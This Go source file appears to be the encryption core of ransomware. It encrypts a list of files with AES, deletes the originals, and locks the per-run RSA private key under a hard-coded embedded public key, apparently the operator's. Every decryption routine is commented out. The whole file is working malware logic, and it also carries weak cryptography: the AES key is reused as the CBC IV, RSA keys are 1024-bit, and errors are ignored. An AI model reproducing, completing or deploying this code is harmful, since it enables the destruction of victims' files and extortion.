package encrypt

import (
	"bufio"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/base64"
	"encoding/pem"
	"errors"
	"os"
	"path/filepath"
)

var public_Key1 = []byte("-----BEGIN PUBLIC KEY-----\nMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3nXmd7bRWeOS3LOktKsm\nnAltGP6cnKvyMsb8VjTpTUe1Puz2hcSg106L64D9mnXQI2dnAgz5RysDd31eC770\ntFgFsQOo8CqEu4xN0YktBsfvl20VVvc1yRY9TcXtWKNXckNVkrGJTNtyOPwTnvLw\nhbKq6iNpuJm4Jv3u0Q/ZgyAk1ae1rnBN3KLgeHHXWs/bDvGfPKp/3oBIqFQn1VOq\n+qddElI2UhyVhRv7+mTuvDYStKhW8f7Yd8RDIwqIdmUHaH4+dF6BtlcDquP9gyAe\nHXXqxKXl/i205LZzXCDulfsYWhALW+ntCukei7GCb6umZsuLbH81ZJfQwKHqu+MP\nSD5FHIuppaOb/AV/o0ynGngvFwHHKSqyDjZ+Y8++D+J0B77vp265xt/I+GVUSK+r\nUJj+CPduVTijgU+pG/GF4qxbSuJQNhtMZk2HgCpVdAovhfXMfRui7CvKhCr9qvpb\nNtGmimkAKlIihQrVNGFkebkOPj6+1RAm/tlz472JQbXdPsTwXGFq5BIWqNn+0f6R\n2h9qj2A/jraLJCF0TyVwvlk1N5S+i5Ei3dlueK2g21wmlr9OrMmn5lecQxvAOhg2\nMV+40p0Ow3LY8Uu7HxbCYtdFiy7YrqZaag5uNfWH2YP9MfeKR5LxH0DlMi6WMQN7\nDaAr0F7ISTGk+6a0CGMZP0kCAwEAAQ==\n-----END PUBLIC KEY-----\n")

func GenRsaKey() (prvkey, pubkey []byte) {
	privateKey, err := rsa.GenerateKey(rand.Reader, 1024)
	if err != nil {
		panic(err)
	}
	derStream := x509.MarshalPKCS1PrivateKey(privateKey)
	block := &pem.Block{
		Type:  "RSA PRIVATE KEY",
		Bytes: derStream,
	}
	prvkey = pem.EncodeToMemory(block)
	publicKey := &privateKey.PublicKey
	derPkix, err := x509.MarshalPKIXPublicKey(publicKey)
	if err != nil {
		panic(err)
	}
	block = &pem.Block{
		Type:  "PUBLIC KEY",
		Bytes: derPkix,
	}
	pubkey = pem.EncodeToMemory(block)
	return
}

func GenAesKey() ([]byte, error) {
	key := make([]byte, 32)

	_, err := rand.Read(key)
	if err != nil {
		// handle error here
	}
	return key, nil
}

func split(buf []byte, lim int) [][]byte {
	var chunk []byte
	chunks := make([][]byte, 0, len(buf)/lim+1)
	for len(buf) >= lim {
		chunk, buf = buf[:lim], buf[lim:]
		chunks = append(chunks, chunk)
	}
	if len(buf) > 0 {
		chunks = append(chunks, buf)
	}
	return chunks
}

func RsaEncrypt(origData []byte, publickey []byte) ([]byte, error) {
	block, _ := pem.Decode(publickey)
	if block == nil {
		return nil, errors.New("public key error")
	}

	pubInterface, err := x509.ParsePKIXPublicKey(block.Bytes)
	if err != nil {
		return nil, err
	}

	pub := pubInterface.(*rsa.PublicKey)

	partLen := pub.N.BitLen()/8 - 11
	chunks := split(origData, partLen)

	buffer := bytes.NewBufferString("")
	for _, chunk := range chunks {
		buff, err := rsa.EncryptPKCS1v15(rand.Reader, pub, chunk)
		if err != nil {
			return []byte(""), err
		}
		buffer.Write(buff)
	}

	return []byte(base64.RawURLEncoding.EncodeToString(buffer.Bytes())), nil
}

//func RsaDecrypt(ciphertext []byte, privatekey []byte) ([]byte, error) {
//	block, _ := pem.Decode(privatekey)
//	if block == nil {
//		panic(errors.New("private key error!"))
//	}
//
//	priv, err := x509.ParsePKCS1PrivateKey(block.Bytes)
//	if err != nil {
//		panic(err)
//	}
//
//	pub := &priv.PublicKey
//	partLen := pub.N.BitLen() / 8
//	raw, err := base64.RawURLEncoding.DecodeString(string(ciphertext))
//	chunks := split([]byte(raw), partLen)
//	buffer := bytes.NewBufferString("")
//	for _, chunk := range chunks {
//		decrypted, err := rsa.DecryptPKCS1v15(rand.Reader, priv, chunk)
//		if err != nil {
//			return []byte(""), err
//		}
//		buffer.Write(decrypted)
//	}
//	return buffer.Bytes(), err
//}

func pkcs7Padding(data []byte, blockSize int) []byte {
	padding := blockSize - len(data)%blockSize
	padText := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(data, padText...)
}

//func pkcs7UnPadding(data []byte) ([]byte, error) {
//	length := len(data)
//	if length == 0 {
//		return nil, errors.New("加密字符串错误！")
//	}
//	unPadding := int(data[length-1])
//	return data[:(length - unPadding)], nil
//}

func AesEncrypt(data []byte, key []byte) ([]byte, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}

	blockSize := block.BlockSize()
	encryptBytes := pkcs7Padding(data, blockSize)
	crypted := make([]byte, len(encryptBytes))
	blockMode := cipher.NewCBCEncrypter(block, key[:blockSize])
	blockMode.CryptBlocks(crypted, encryptBytes)
	return crypted, nil
}

//func AesDecrypt(data []byte, key []byte) ([]byte, error) {
//	block, err := aes.NewCipher(key)
//	if err != nil {
//		return nil, err
//	}
//
//	blockSize := block.BlockSize()
//	blockMode := cipher.NewCBCDecrypter(block, key[:blockSize])
//	crypted := make([]byte, len(data))
//	blockMode.CryptBlocks(crypted, data)
//	crypted, err = pkcs7UnPadding(crypted)
//	if err != nil {
//		return nil, err
//	}
//	return crypted, nil
//}

func _AesEncrypt(data, key []byte) (string, error) {
	res, err := AesEncrypt(data, key)
	if err != nil {
		return "", err
	}
	return base64.StdEncoding.EncodeToString(res), nil
}

//func _AesDecrypt(data string, key []byte) ([]byte, error) {
//	dataByte, err := base64.StdEncoding.DecodeString(data)
//	if err != nil {
//		return nil, err
//	}
//	return AesDecrypt(dataByte, key)
//}

func AesEncryptFile(filePath string, key []byte) (err error) {
	fileDir := filepath.Dir(filePath)
	fileName := filepath.Base(filePath)
	fileName += ".enc"

	f, err := os.Open(filePath)
	if err != nil {
		return
	}
	defer os.Remove(filePath)
	defer f.Close()

	fInfo, _ := f.Stat()
	fLen := fInfo.Size()

	maxLen := 1024 * 1024 * 100
	var forNum int64 = 0
	getLen := fLen

	if fLen > int64(maxLen) {
		getLen = int64(maxLen)
		forNum = fLen / int64(maxLen)
	}
	newFilePath := fileDir + "\\" + fileName
	ff, err := os.OpenFile(newFilePath, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		return err
	}
	defer ff.Close()

	for i := 0; i < int(forNum+1); i++ {
		a := make([]byte, getLen)
		n, err := f.Read(a)
		if err != nil {
			return err
		}
		getByte, err := _AesEncrypt(a[:n], key)
		if err != nil {
			return err
		}

		getBytes := append([]byte(getByte), []byte("\n")...)
		buf := bufio.NewWriter(ff)
		buf.WriteString(string(getBytes[:]))
		buf.Flush()
	}
	return nil
}

//func DecryptFile(filePath, key []byte) (err error) {
//	f, err := os.Open(filePath)
//	if err != nil {
//		fmt.Println("未找到文件")
//		return
//	}
//	defer f.Close()
//
//	br := bufio.NewReader(f)
//	ff, err := os.OpenFile("decryptFile_"+filePath, os.O_WRONLY|os.O_CREATE|os.O_APPEND, 0666)
//	if err != nil {
//		return err
//	}
//	defer ff.Close()
//	num := 0
//	for {
//		num = num + 1
//		a, err := br.ReadString('\n')
//		if err != nil {
//			break
//		}
//		getByte, err := _AesDecrypt(a, key)
//		if err != nil {
//			return err
//		}
//
//		buf := bufio.NewWriter(ff)
//		buf.Write(getByte)
//		buf.Flush()
//	}
//	return
//}

func Run(filename []string) {
	private_Key2, public_Key2 := GenRsaKey()
	key, _ := GenAesKey()

	for _, _file := range filename {
		AesEncryptFile(_file, key)
	}

	data1, _ := RsaEncrypt(private_Key2, public_Key1)
	_file1, _ := os.Create("prikey.enc")
	defer _file1.Close()
	_file1.Write(data1)

	data2, _ := RsaEncrypt(key, public_Key2)
	_file2, _ := os.Create("aeskey.enc")
	defer _file2.Close()
	_file2.Write(data2)

	return
}
